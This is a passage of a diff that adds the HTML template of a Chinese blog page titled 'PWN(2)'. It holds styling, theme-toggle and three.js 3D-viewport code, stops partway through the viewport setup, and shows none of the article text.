@@ -1,0 +1,2207 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PWN(2)</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=Noto+Sans+SC:wght@400;500;700&family=Noto+Serif+SC:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css">
+  
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/themes/prism-tomorrow.css">
+  <script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-core.min.js"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/line-numbers/prism-line-numbers.min.js"></script>
+  
+  <style>html {
+  font-size: 17px;
+  scroll-behavior: smooth;
+}
+
+:root {
+  --page-bg: #f7f8fa;
+  --paper: #ffffff;
+  --paper-strong: #ffffff;
+  --ink-900: #111827;
+  --ink-700: #374151;
+  --ink-500: #6b7280;
+  --line: #e5e7eb;
+  --line-strong: #d1d5db;
+  --accent: #2563eb;
+  --accent-soft: rgba(37, 99, 235, 0.1);
+  --shadow-soft: 0 10px 24px rgba(15, 23, 42, 0.06);
+  --shadow-hard: 0 18px 42px rgba(15, 23, 42, 0.08);
+  --content-width: 900px;
+  --toc-width: 320px;
+  --display-font: "Noto Sans SC", "PingFang SC", sans-serif;
+  --body-font: "Noto Serif SC", "STSong", serif;
+  --sans-font: "Noto Sans SC", "PingFang SC", sans-serif;
+  --mono-font: "IBM Plex Mono", monospace;
+  --selection-bg: rgba(37, 99, 235, 0.18);
+  --selection-ink: #0b1020;
+  --blockquote-border: #93c5fd;
+  --blockquote-bg: #f8fafc;
+  --code-bg: #eff6ff;
+  --code-ink: #1d4ed8;
+}
+
+:root[data-theme="dark"] {
+  --page-bg: #0b1120;
+  --paper: #0f172a;
+  --paper-strong: #111b31;
+  --ink-900: #e5edf8;
+  --ink-700: #c3d2e7;
+  --ink-500: #94a8c2;
+  --line: #22314b;
+  --line-strong: #324767;
+  --accent: #60a5fa;
+  --accent-soft: rgba(96, 165, 250, 0.2);
+  --shadow-soft: 0 10px 24px rgba(2, 6, 23, 0.4);
+  --shadow-hard: 0 18px 42px rgba(2, 6, 23, 0.46);
+  --selection-bg: rgba(96, 165, 250, 0.3);
+  --selection-ink: #ecf4ff;
+  --blockquote-border: #3b82f6;
+  --blockquote-bg: #0c172b;
+  --code-bg: #11203a;
+  --code-ink: #bfdbfe;
+}
+
+* {
+  box-sizing: border-box;
+}
+
+*::selection {
+  background: var(--selection-bg);
+  color: var(--selection-ink);
+}
+
+body {
+  margin: 0;
+  min-height: 100vh;
+  color: var(--ink-700);
+  font-family: var(--body-font);
+  line-height: 1.76;
+  background: var(--page-bg);
+}
+
+body.is-3d-ready {
+  overflow: hidden;
+  background:
+    radial-gradient(circle at 14% 18%, rgba(148, 163, 184, 0.25), rgba(148, 163, 184, 0) 38%),
+    radial-gradient(circle at 84% 10%, rgba(191, 219, 254, 0.34), rgba(191, 219, 254, 0) 34%),
+    radial-gradient(circle at 50% 100%, rgba(71, 85, 105, 0.22), rgba(71, 85, 105, 0) 60%),
+    linear-gradient(165deg, #f8fbff 0%, #ecf2f8 46%, #e5edf6 100%);
+}
+
+:root[data-theme="dark"] body.is-3d-ready {
+  background:
+    radial-gradient(circle at 14% 18%, rgba(30, 64, 175, 0.2), rgba(30, 64, 175, 0) 38%),
+    radial-gradient(circle at 84% 10%, rgba(14, 116, 144, 0.18), rgba(14, 116, 144, 0) 34%),
+    radial-gradient(circle at 50% 100%, rgba(30, 41, 59, 0.25), rgba(30, 41, 59, 0) 60%),
+    linear-gradient(165deg, #0b1220 0%, #0a162b 48%, #0a1a33 100%);
+}
+
+body.is-3d-ready.is-dragging {
+  cursor: grabbing;
+  user-select: none;
+}
+
+h1,
+h2,
+h3,
+h4,
+h5,
+h6 {
+  color: var(--ink-900);
+  font-weight: 600;
+  line-height: 1.25;
+  margin: 1.18em 0 0.42em;
+  scroll-margin-top: 28px;
+}
+
+h1 {
+  font-size: 2rem;
+}
+
+h2 {
+  font-size: 1.58rem;
+}
+
+h3 {
+  font-size: 1.28rem;
+}
+
+h4 {
+  font-size: 1.08rem;
+}
+
+p,
+ul,
+ol,
+blockquote,
+table,
+pre,
+figure {
+  margin: 0.74rem 0 0.96rem;
+}
+
+p,
+li,
+td,
+th {
+  font-size: 1rem;
+}
+
+ul,
+ol {
+  padding-left: 1.42rem;
+}
+
+li + li {
+  margin-top: 0.2rem;
+}
+
+a {
+  color: var(--ink-900);
+  text-decoration: underline;
+  text-decoration-thickness: 1px;
+  text-underline-offset: 0.18em;
+  text-decoration-color: rgba(37, 99, 235, 0.45);
+  transition: color 220ms ease, text-decoration-color 220ms ease, background-size 220ms ease;
+}
+
+a:hover {
+  color: var(--accent);
+  text-decoration-color: var(--accent);
+}
+
+blockquote {
+  margin-left: 0;
+  padding: 0.72rem 0.92rem;
+  border-left: 3px solid var(--blockquote-border);
+  color: var(--ink-700);
+  background: var(--blockquote-bg);
+}
+
+pre {
+  overflow-x: auto;
+  padding: 0.88rem 0.92rem;
+  border: 1px solid #1f2937;
+  border-radius: 10px;
+  background: #111827;
+}
+
+pre[class*="language-"] {
+  position: relative;
+  padding-top: 2.15rem;
+}
+
+pre[class*="language-"]::before {
+  content: attr(data-language);
+  position: absolute;
+  top: 0.58rem;
+  right: 0.75rem;
+  color: #c0c7d2;
+  font-family: var(--mono-font);
+  font-size: 0.64rem;
+  letter-spacing: 0.08em;
+  text-transform: uppercase;
+}
+
+code {
+  font-family: var(--mono-font);
+  font-size: 0.86em;
+  background: var(--code-bg);
+  color: var(--code-ink);
+  padding: 0.08rem 0.28rem;
+  border-radius: 4px;
+}
+
+pre code {
+  background: transparent;
+  color: inherit;
+  padding: 0;
+}
+
+table {
+  width: 100%;
+  border-collapse: collapse;
+}
+
+th,
+td {
+  padding: 0.48rem 0.58rem;
+  border-bottom: 1px solid var(--line);
+  text-align: left;
+}
+
+th {
+  color: var(--ink-900);
+  font-family: var(--sans-font);
+  font-weight: 600;
+  letter-spacing: 0.03em;
+}
+
+img {
+  max-width: 100%;
+  height: auto;
+  display: block;
+  margin: 0.3rem auto;
+  border-radius: 8px;
+}
+
+figcaption {
+  margin-top: 0.4rem;
+  color: var(--ink-500);
+  font-size: 0.84rem;
+  text-align: center;
+}
+
+hr {
+  border: 0;
+  border-top: 1px solid var(--line);
+  margin: 1.2rem 0;
+}
+
+:root[data-theme="dark"] .content-shell {
+  background: rgba(15, 23, 42, 0.94);
+}
+
+:root[data-theme="dark"] .nav-link {
+  background: rgba(15, 23, 42, 0.92);
+}
+
+:root[data-theme="dark"] .toc-item > a::before,
+:root[data-theme="dark"] .toc-tree-link::before,
+:root[data-theme="dark"] .toc-folder > summary::before {
+  background: #64748b;
+}
+
+:root[data-theme="dark"] .toc-item > a:hover,
+:root[data-theme="dark"] .toc-item > a.is-active,
+:root[data-theme="dark"] .toc-tree-link:hover,
+:root[data-theme="dark"] .toc-tree-link.is-active,
+:root[data-theme="dark"] .toc-folder > summary:hover,
+:root[data-theme="dark"] .toc-folder[open] > summary {
+  background: rgba(148, 163, 184, 0.15);
+}
+
+:root[data-theme="dark"] .sidebar-inner::-webkit-scrollbar-thumb {
+  background: rgba(148, 163, 184, 0.42);
+}
+
+:root[data-theme="dark"] body.is-3d-ready .scene-plane::before {
+  border: 0;
+  background:
+    radial-gradient(circle at 12% 16%, rgba(51, 65, 85, 0.5), rgba(51, 65, 85, 0) 42%),
+    linear-gradient(145deg, rgba(15, 23, 42, 0.9), rgba(30, 41, 59, 0.78)),
+    linear-gradient(180deg, rgba(30, 41, 59, 0.26), rgba(30, 41, 59, 0));
+  box-shadow:
+    0 52px 120px rgba(2, 6, 23, 0.52),
+    inset 0 1px 0 rgba(148, 163, 184, 0.22);
+}
+
+:root[data-theme="dark"] body.is-3d-ready .scene-plane::after {
+  background: radial-gradient(circle at 50% 40%, rgba(37, 99, 235, 0.2), rgba(37, 99, 235, 0) 68%);
+}
+
+:root[data-theme="dark"] body.is-3d-ready .content-shell {
+  border: 0;
+  background: linear-gradient(160deg, rgba(15, 23, 42, 0.94), rgba(30, 41, 59, 0.88));
+  box-shadow: 0 34px 84px rgba(2, 6, 23, 0.5);
+}
+
+:root[data-theme="dark"] body.is-3d-ready .sidebar-inner {
+  border: 0;
+  background: linear-gradient(165deg, rgba(15, 23, 42, 0.88), rgba(30, 41, 59, 0.82));
+  box-shadow: 0 20px 52px rgba(2, 6, 23, 0.46);
+}
+
+:root[data-theme="dark"] body.is-3d-ready .scene-hud {
+  background: transparent;
+}
+
+
+.viewport-shell {
+  position: relative;
+  min-height: 100vh;
+}
+
+.three-shell,
+.scene-hud {
+  display: none;
+}
+
+.scene-plane {
+  position: relative;
+  width: min(1280px, calc(100vw - 32px));
+  margin: 0 auto;
+}
+
+.main-shell {
+  width: 100%;
+  margin: 0 auto;
+  display: grid;
+  grid-template-columns: minmax(0, var(--content-width)) minmax(0, var(--toc-width));
+  gap: 24px;
+  align-items: start;
+  padding: 24px 20px 36px;
+}
+
+.content-shell {
+  min-width: 0;
+  padding: 1.5rem 1.4rem 1.15rem;
+  border: 0;
+  background: rgba(255, 255, 255, 0.96);
+  border-radius: 16px;
+  box-shadow: var(--shadow-hard);
+}
+
+.sidebar-shell {
+  position: sticky;
+  top: 16px;
+  align-self: start;
+  min-width: 0;
+}
+
+.header-shell {
+  margin-bottom: 0.9rem;
+  padding-bottom: 0.9rem;
+  border-bottom: 1px solid var(--line);
+}
+
+.title-row {
+  display: block;
+}
+
+.page-title {
+  margin: 0;
+  font-family: var(--display-font);
+  font-size: clamp(1.8rem, 2.3vw, 2.3rem);
+  font-weight: 700;
+  letter-spacing: 0.01em;
+  line-height: 1.2;
+  color: var(--ink-900);
+}
+
+.eyebrow {
+  margin: 0 0 0.35rem;
+  color: var(--ink-500);
+  font-family: var(--sans-font);
+  font-size: 0.74rem;
+  letter-spacing: 0.16em;
+  text-transform: uppercase;
+}
+
+.global-nav {
+  margin-top: 0.8rem;
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.4rem;
+}
+
+.nav-link {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  padding: 0.22rem 0.58rem;
+  border: 1px solid var(--line-strong);
+  border-radius: 999px;
+  text-decoration: none;
+  color: var(--ink-700);
+  background: rgba(255, 255, 255, 0.92);
+  font-family: var(--mono-font);
+  font-size: 0.7rem;
+  letter-spacing: 0.04em;
+  text-transform: uppercase;
+  transition: border-color 160ms ease, color 160ms ease, background 160ms ease, transform 160ms ease;
+}
+
+.nav-link:hover,
+.nav-link.is-active {
+  color: var(--accent);
+  border-color: var(--accent);
+  background: var(--accent-soft);
+}
+
+.article-shell {
+  margin-top: 0.75rem;
+}
+
+.site-footer {
+  margin-top: 1.2rem;
+  padding-top: 0;
+}
+
+.site-footer-inner {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.4rem;
+  padding-top: 0.52rem;
+  border-top: 1px solid var(--line);
+  color: var(--ink-500);
+  font-family: var(--mono-font);
+  font-size: 0.68rem;
+  letter-spacing: 0.03em;
+  text-transform: uppercase;
+}
+
+body.is-3d-ready .viewport-shell {
+  position: fixed;
+  inset: 0;
+  overflow: hidden;
+  cursor: grab;
+}
+
+body.is-3d-ready .three-shell {
+  display: block;
+  position: absolute;
+  inset: 0;
+}
+
+body.is-3d-ready .three-webgl-layer,
+body.is-3d-ready .three-css-layer {
+  position: absolute;
+  inset: 0;
+}
+
+body.is-3d-ready .three-webgl-layer {
+  z-index: 1;
+  pointer-events: none;
+  filter: saturate(1.08) contrast(1.05);
+}
+
+body.is-3d-ready .three-css-layer {
+  z-index: 2;
+}
+
+body.is-3d-ready .three-css-layer > div {
+  overflow: visible !important;
+}
+
+body.is-3d-ready .scene-plane {
+  width: min(1280px, calc(100vw - 40px));
+  margin: 0;
+  transform-style: preserve-3d;
+  will-change: transform;
+}
+
+body.is-3d-ready .scene-plane::before {
+  content: "";
+  position: absolute;
+  inset: -52px;
+  border-radius: 32px;
+  border: 0;
+  background:
+    radial-gradient(circle at 12% 16%, rgba(255, 255, 255, 0.9), rgba(255, 255, 255, 0) 42%),
+    linear-gradient(145deg, rgba(255, 255, 255, 0.84), rgba(241, 245, 249, 0.5)),
+    linear-gradient(180deg, rgba(148, 163, 184, 0.1), rgba(148, 163, 184, 0));
+  box-shadow:
+    0 52px 120px rgba(15, 23, 42, 0.16),
+    inset 0 1px 0 rgba(255, 255, 255, 0.92);
+  transform: translateZ(-110px);
+  pointer-events: none;
+}
+
+body.is-3d-ready .scene-plane::after {
+  content: "";
+  position: absolute;
+  inset: -74px;
+  border-radius: 40px;
+  background: radial-gradient(circle at 50% 40%, rgba(59, 130, 246, 0.12), rgba(59, 130, 246, 0) 68%);
+  filter: blur(18px);
+  transform: translateZ(-180px);
+  pointer-events: none;
+}
+
+body.is-3d-ready .main-shell {
+  transform-style: preserve-3d;
+}
+
+body.is-3d-ready .content-shell {
+  position: relative;
+  transform: translate3d(0, 0, 28px);
+  border: 0;
+  background:
+    linear-gradient(160deg, rgba(255, 255, 255, 0.96), rgba(248, 251, 255, 0.9));
+  box-shadow:
+    0 34px 84px rgba(15, 23, 42, 0.16);
+  backdrop-filter: blur(10px);
+  user-select: text;
+  -webkit-user-select: text;
+}
+
+body.is-3d-ready .article-shell,
+body.is-3d-ready .markdown-content,
+body.is-3d-ready .article-shell *,
+body.is-3d-ready .markdown-content * {
+  user-select: text;
+  -webkit-user-select: text;
+}
+
+body.is-3d-ready .sidebar-shell {
+  position: relative;
+  top: 0;
+  transform: translate3d(0, var(--sidebar-offset, 0px), 56px);
+  will-change: transform;
+}
+
+body.is-3d-ready .sidebar-inner {
+  border: 0;
+  background:
+    linear-gradient(165deg, rgba(255, 255, 255, 0.9), rgba(241, 245, 249, 0.82));
+  box-shadow: 0 20px 52px rgba(15, 23, 42, 0.14);
+  backdrop-filter: blur(12px);
+}
+
+body.is-3d-ready .nav-link:hover,
+body.is-3d-ready .nav-link.is-active {
+  transform: translateZ(10px);
+}
+
+body.is-3d-ready .scene-hud {
+  display: block;
+  position: relative;
+  margin-top: 28px;
+  z-index: 1;
+  padding: 0;
+  border: 0;
+  border-radius: 0;
+  background: transparent;
+  backdrop-filter: none;
+  color: var(--ink-500);
+  font-family: var(--mono-font);
+  font-size: 0.66rem;
+  line-height: 1.56;
+  letter-spacing: 0.01em;
+  pointer-events: none;
+}
+
+body.is-3d-ready .scene-hud-line {
+  display: block;
+  white-space: normal;
+}
+
+body.is-3d-ready .scene-hud-line + .scene-hud-line {
+  margin-top: 0.08rem;
+}
+
+
+.sidebar-inner {
+  max-height: calc(100vh - 42px);
+  overflow: auto;
+  padding: 0.9rem 0.85rem 1rem;
+  border: 0;
+  background: var(--paper-strong);
+  border-radius: 10px;
+  box-shadow: var(--shadow-soft);
+}
+
+.sidebar-inner::-webkit-scrollbar {
+  width: 8px;
+}
+
+.sidebar-inner::-webkit-scrollbar-thumb {
+  background: rgba(86, 67, 52, 0.35);
+  border-radius: 999px;
+}
+
+.sidebar-title {
+  margin: 0 0 0.72rem;
+  color: var(--ink-900);
+  font-family: var(--sans-font);
+  font-size: 1rem;
+  font-weight: 600;
+}
+
+.toc-empty {
+  margin: 0;
+  color: var(--ink-500);
+  font-size: 0.9rem;
+}
+
+.toc-nav,
+.toc-list {
+  margin: 0;
+  padding: 0;
+  list-style: none;
+}
+
+.toc-list {
+  display: grid;
+  gap: 0.12rem;
+}
+
+.toc-item,
+.toc-folder {
+  margin: 0;
+}
+
+.toc-level-1 {
+  --indent: 0rem;
+  --dot-size: 0.32rem;
+}
+
+.toc-level-2 {
+  --indent: 0.95rem;
+  --dot-size: 0.34rem;
+}
+
+.toc-level-3 {
+  --indent: 1.85rem;
+  --dot-size: 0.3rem;
+}
+
+.toc-level-4 {
+  --indent: 2.72rem;
+  --dot-size: 0.28rem;
+}
+
+.toc-item > a,
+.toc-tree-link,
+.toc-folder > summary {
+  position: relative;
+  display: block;
+  color: var(--ink-500);
+  text-decoration: none;
+  font-family: var(--sans-font);
+  font-size: 0.85rem;
+  line-height: 1.42;
+  padding: 0.12rem 0.22rem 0.12rem calc(var(--indent, 0rem) + 0.82rem);
+  border-radius: 6px;
+  transition: color 170ms ease, background 170ms ease;
+}
+
+.toc-item > a::before,
+.toc-tree-link::before,
+.toc-folder > summary::before {
+  content: "";
+  position: absolute;
+  left: calc(var(--indent, 0rem) + 0.1rem);
+  top: 0.58rem;
+  width: var(--dot-size, 0.34rem);
+  height: var(--dot-size, 0.34rem);
+  border-radius: 999px;
+  background: #9ca3af;
+}
+
+.toc-item > a:hover,
+.toc-item > a.is-active,
+.toc-tree-link:hover,
+.toc-tree-link.is-active,
+.toc-folder > summary:hover,
+.toc-folder[open] > summary {
+  color: var(--ink-900);
+  background: #f3f4f6;
+}
+
+.toc-item > a.is-active::before,
+.toc-tree-link.is-active::before,
+.toc-folder[open] > summary::before {
+  background: var(--accent);
+}
+
+.toc-folder > summary {
+  list-style: none;
+  cursor: pointer;
+}
+
+.toc-folder > summary::-webkit-details-marker {
+  display: none;
+}
+
+.toc-folder-body {
+  margin-left: calc(var(--indent, 0rem) + 0.35rem);
+  padding-left: 0.46rem;
+  border-left: 1px solid var(--line);
+  display: grid;
+  gap: 0.08rem;
+}
+
+
+.article-shell,
+.markdown-content {
+  word-break: break-word;
+  overflow-wrap: anywhere;
+}
+
+.article-shell h1,
+.article-shell h2,
+.article-shell h3,
+.article-shell h4,
+.article-shell h5,
+.article-shell h6,
+.markdown-content h1,
+.markdown-content h2,
+.markdown-content h3,
+.markdown-content h4,
+.markdown-content h5,
+.markdown-content h6 {
+  color: var(--ink-900);
+}
+
+.article-shell h1,
+.markdown-content h1 {
+  font-family: var(--display-font);
+  font-size: clamp(1.88rem, 2.8vw, 2.3rem);
+  letter-spacing: 0.01em;
+}
+
+.article-shell h2,
+.markdown-content h2 {
+  font-size: 1.46rem;
+  padding-top: 0.2rem;
+}
+
+.article-shell h3,
+.markdown-content h3 {
+  font-size: 1.2rem;
+}
+
+.article-shell h4,
+.markdown-content h4 {
+  font-size: 1.1rem;
+}
+
+.article-shell p,
+.markdown-content p {
+  margin: 0.74rem 0;
+}
+
+.article-shell p + p,
+.markdown-content p + p {
+  text-indent: 0;
+}
+
+.article-shell ul,
+.article-shell ol,
+.markdown-content ul,
+.markdown-content ol {
+  margin: 0.74rem 0 0.92rem;
+}
+
+.article-shell li,
+.markdown-content li {
+  margin: 0;
+}
+
+.article-shell blockquote,
+.markdown-content blockquote {
+  margin: 0.82rem 0 1rem;
+}
+
+.katex-display {
+  overflow-x: auto;
+  overflow-y: hidden;
+  padding-bottom: 0.2rem;
+}
+
+.home-intro {
+  padding: 0.2rem 0 0.85rem;
+  margin-bottom: 1.05rem;
+  border-bottom: 1px solid var(--line);
+}
+
+.listing-section + .listing-section {
+  margin-top: 1.6rem;
+}
+
+.section-heading {
+  margin-bottom: 0.78rem;
+}
+
+.section-title {
+  margin: 0;
+  font-family: var(--display-font);
+  font-size: 1.4rem;
+  letter-spacing: 0;
+  color: var(--ink-900);
+}
+
+.section-note {
+  margin: 0.2rem 0 0;
+  color: var(--ink-500);
+  font-family: var(--mono-font);
+  font-size: 0.72rem;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+}
+
+.post-list {
+  margin: 0;
+  padding: 0;
+  list-style: none;
+  display: grid;
+  gap: 0.72rem;
+}
+
+.post-list li {
+  padding: 0;
+  border-bottom: 0;
+}
+
+.post-card {
+  margin: 0;
+  padding: 0.85rem 0;
+  border: 1px solid var(--line);
+  border-left: 0;
+  border-right: 0;
+  background: transparent;
+  transition: border-color 190ms ease;
+}
+
+.post-card:hover {
+  border-color: var(--line-strong);
+}
+
+.post-card-title {
+  margin: 0;
+  font-size: 1.2rem;
+  line-height: 1.34;
+  color: var(--ink-900);
+}
+
+.post-card-title a {
+  text-decoration: none;
+}
+
+.post-card-excerpt {
+  margin-top: 0.4rem;
+  color: var(--ink-700);
+  font-size: 0.93rem;
+}
+
+.empty-state {
+  margin: 0;
+  color: var(--ink-500);
+  font-style: italic;
+}
+
+
+.taxonomy-paper {
+  padding: 0.3rem 0;
+}
+
+.taxonomy-group {
+  margin: 0;
+  padding: 0.86rem 0;
+  border-top: 1px solid var(--line);
+}
+
+.taxonomy-group:first-child {
+  border-top: 0;
+}
+
+.taxonomy-heading {
+  margin: 0;
+  color: var(--ink-900);
+  font-size: 1.12rem;
+  line-height: 1.35;
+}
+
+.group-count {
+  margin-left: 0.3rem;
+  color: var(--ink-500);
+  font-family: var(--mono-font);
+  font-size: 0.68rem;
+  letter-spacing: 0.08em;
+}
+
+.taxonomy-index-list {
+  margin: 0.52rem 0 0;
+  padding-left: 1.26rem;
+}
+
+.taxonomy-index-list li {
+  margin: 0.14rem 0;
+  font-size: 0.96rem;
+}
+
+.taxonomy-children {
+  margin-top: 0.56rem;
+  padding-left: 0.84rem;
+  border-left: 1px solid var(--line);
+  display: grid;
+  gap: 0.52rem;
+}
+
+.article-pager {
+  margin-top: 1.5rem;
+  padding-top: 0.82rem;
+  border-top: 1px solid var(--line);
+  width: 100%;
+  display: grid;
+  grid-template-columns: minmax(0, 1fr) auto minmax(0, 1fr);
+  align-items: center;
+  gap: 0.55rem;
+}
+
+.pager-link {
+  color: var(--ink-900);
+  font-family: var(--sans-font);
+  font-size: 0.89rem;
+  text-decoration: none;
+  transition: color 160ms ease;
+}
+
+.pager-prev {
+  justify-self: start;
+}
+
+.pager-home {
+  justify-self: center;
+  font-family: var(--mono-font);
+  letter-spacing: 0.06em;
+  text-transform: uppercase;
+}
+
+.pager-next {
+  justify-self: end;
+}
+
+.pager-link:hover {
+  color: var(--accent);
+}
+
+.pager-link.is-disabled {
+  color: rgba(111, 94, 81, 0.5);
+  cursor: default;
+  pointer-events: none;
+}
+
+.post-card-meta {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.34rem;
+  margin-top: 0.42rem;
+}
+
+.meta-pill {
+  display: inline-flex;
+  align-items: center;
+  color: var(--ink-500);
+  text-decoration: none;
+  font-family: var(--mono-font);
+  font-size: 0.68rem;
+  letter-spacing: 0.03em;
+}
+
+.meta-pill:hover {
+  color: var(--accent);
+}
+
+.meta-date {
+  color: var(--ink-700);
+}
+
+
+@media (max-width: 1240px) {
+  :root {
+    --content-width: 1fr;
+    --toc-width: 300px;
+  }
+
+  .scene-plane {
+    width: min(1120px, calc(100vw - 32px));
+  }
+
+  .main-shell {
+    padding-inline: 18px;
+    gap: 20px;
+  }
+
+  .content-shell {
+    padding-inline: 1.2rem;
+  }
+}
+
+@media (max-width: 980px) {
+  .main-shell {
+    grid-template-columns: 1fr;
+    gap: 16px;
+    padding: 16px 12px 24px;
+  }
+
+  .sidebar-shell {
+    order: -1;
+    position: static;
+  }
+
+  .content-shell {
+    box-shadow: 0 10px 24px rgba(15, 23, 42, 0.06);
+  }
+
+  .scene-hud {
+    display: none;
+  }
+
+  .sidebar-inner {
+    max-height: 40vh;
+    overflow: auto;
+  }
+
+  body.is-3d-ready {
+    overflow: auto;
+    background: var(--page-bg);
+  }
+
+  body.is-3d-ready .viewport-shell {
+    position: relative;
+    inset: auto;
+    overflow: visible;
+  }
+
+  body.is-3d-ready .three-shell,
+  body.is-3d-ready .scene-hud {
+    display: none !important;
+  }
+
+  body.is-3d-ready .scene-plane {
+    width: min(1120px, calc(100vw - 32px));
+    margin: 0 auto;
+    transform: none;
+  }
+
+  body.is-3d-ready .scene-plane::before,
+  body.is-3d-ready .scene-plane::after {
+    content: none;
+  }
+
+  body.is-3d-ready .main-shell,
+  body.is-3d-ready .content-shell,
+  body.is-3d-ready .sidebar-shell,
+  body.is-3d-ready .nav-link:hover,
+  body.is-3d-ready .nav-link.is-active {
+    transform: none !important;
+    backdrop-filter: none;
+  }
+}
+
+@media (hover: none), (pointer: coarse) {
+  body.is-3d-ready .three-shell,
+  body.is-3d-ready .scene-hud {
+    display: none !important;
+  }
+
+  body.is-3d-ready .viewport-shell {
+    position: relative;
+    inset: auto;
+    overflow: visible;
+  }
+}
+
+@media (max-width: 720px) {
+  html {
+    font-size: 16px;
+  }
+
+  .content-shell {
+    padding: 1rem 0.82rem;
+  }
+
+  .page-title {
+    font-size: clamp(1.58rem, 7.4vw, 2.02rem);
+  }
+
+  .global-nav {
+    gap: 0.4rem;
+  }
+
+  .nav-link {
+    padding: 0.2rem 0.52rem;
+  }
+
+  .home-intro {
+    padding-bottom: 0.66rem;
+  }
+
+  .post-card {
+    padding: 0.76rem;
+  }
+
+  .article-shell p + p,
+  .markdown-content p + p {
+    text-indent: 0;
+  }
+
+  .article-pager {
+    grid-template-columns: 1fr;
+    gap: 0.38rem;
+  }
+
+  .pager-prev,
+  .pager-home,
+  .pager-next {
+    justify-self: start;
+  }
+}
+</style>
+  <script type="importmap">
+    {
+      "imports": {
+        "three": "https://cdn.jsdelivr.net/npm/three@0.180.0/build/three.module.js",
+        "three/addons/": "https://cdn.jsdelivr.net/npm/three@0.180.0/examples/jsm/"
+      }
+    }
+  </script>
+  <script type="module">function setupDayNightSwitch() {
+  const STORAGE_KEY = 'preferred-theme';
+  const root = document.documentElement;
+  const media = window.matchMedia('(prefers-color-scheme: dark)');
+
+  function applyTheme(theme) {
+    root.dataset.theme = theme;
+  }
+
+  function resolveInitialTheme() {
+    const savedTheme = window.localStorage.getItem(STORAGE_KEY);
+    if (savedTheme === 'light' || savedTheme === 'dark') return savedTheme;
+    return media.matches ? 'dark' : 'light';
+  }
+
+  function toggleTheme() {
+    const nextTheme = root.dataset.theme === 'dark' ? 'light' : 'dark';
+    applyTheme(nextTheme);
+    window.localStorage.setItem(STORAGE_KEY, nextTheme);
+  }
+
+  function onKeyDown(event) {
+    if (event.code !== 'Tab') return;
+    if (event.altKey || event.ctrlKey || event.metaKey) return;
+
+    event.preventDefault();
+    toggleTheme();
+  }
+
+  applyTheme(resolveInitialTheme());
+
+  // 仅在用户未手动设置主题时，跟随系统明暗变化。
+  media.addEventListener('change', (event) => {
+    const savedTheme = window.localStorage.getItem(STORAGE_KEY);
+    if (savedTheme === 'light' || savedTheme === 'dark') return;
+    applyTheme(event.matches ? 'dark' : 'light');
+  });
+
+  window.addEventListener('keydown', onKeyDown);
+}
+
+
+import * as THREE from 'three';
+import { CSS3DObject, CSS3DRenderer } from 'three/addons/renderers/CSS3DRenderer.js';
+
+window.addEventListener('DOMContentLoaded', () => {
+  window.Prism?.highlightAll?.();
+
+  setupDayNightSwitch();
+  setupActiveToc();
+  setupThreeViewport();
+});
+
+function setupActiveToc() {
+  const tocLinks = Array.from(document.querySelectorAll('.toc-nav a'));
+  const headings = tocLinks
+    .map((link) => document.getElementById((link.getAttribute('href') || '').slice(1)))
+    .filter(Boolean);
+
+  if (!tocLinks.length || !headings.length) return;
+
+  const byId = new Map(
+    tocLinks
+      .map((link) => {
+        const href = link.getAttribute('href') || '';
+        return href.startsWith('#') ? [href.slice(1), link] : null;
+      })
+      .filter(Boolean)
+  );
+
+  const observer = new IntersectionObserver((entries) => {
+    for (const entry of entries) {
+      if (!entry.isIntersecting) continue;
+
+      for (const link of tocLinks) link.classList.remove('is-active');
+
+      const active = byId.get(entry.target.id);
+      if (active) active.classList.add('is-active');
+    }
+  }, { rootMargin: '-20% 0px -70% 0px', threshold: 0.1 });
+
+  for (const heading of headings) observer.observe(heading);
+}
+
+function setupThreeViewport() {
+  const viewportShell = document.querySelector('.viewport-shell');
+  const renderHost = document.querySelector('.three-shell');
+  const scenePlane = document.querySelector('.scene-plane');
+  const mainShell = document.querySelector('.main-shell');
+  const sidebarShell = document.querySelector('.sidebar-shell');
+  const sceneHud = document.querySelector('.scene-hud');
+
+  if (!viewportShell || !renderHost || !scenePlane || !mainShell) return;
+
+  const body = document.body;
+  const moveKeyPattern = /^Key[WASD]$/;
+  const viewKeys = ['panY', 'panX', 'pitch', 'yaw', 'panZ'];
+
+  const config = {
+    topPadding: 28,
+    bottomPadding: 44,
+    anchorGap: 34,
+    minPanZ: 1200,
+    maxPanZ: 1800,
+    baseFov: 45,
+    pitchLimit: THREE.MathUtils.degToRad(15),
+    yawLimit: THREE.MathUtils.degToRad(15),
+    pitchStep: 0.001,
+    yawStep: 0.001,
+    panYSpeed: 0.78,
+    panSpeed: 560,
+    panZSpeed: 520,
+    damping: 5,
+    resetDamping: 2.2,
+    anchorDamping: 3.2,
+    defaultPanXRange: 800
+  };
+
+  const state = {
+    enabled: false,
+    frameId: 0,
+    lastTick: 0,
+    isResetting: false,
+    isAnchorJumping: false,
+    lastSidebarOffset: null,
+    drag: null,
+    keys: new Set(),
+    bounds: {
+      neutralY: 0,
+      maxPanY: 0,
+      maxPanX: config.defaultPanXRange,
+      maxSidebarOffset: 0
+    },
+    current: createViewState(),
+    target: createViewState()
+  };
+
+  function createViewState() {
+    return {
+      panY: 0,
+      panX: 0,
+      pitch: 0,
+      yaw: 0,
+      panZ: config.minPanZ
+    };
+  }
+
+  const cssScene = new THREE.Scene();
+  const camera = new THREE.PerspectiveCamera(45, 1, 1, 6000);
+  camera.rotation.order = 'YXZ';
+  const panelObject = new CSS3DObject(scenePlane);
+  cssScene.add(panelObject);
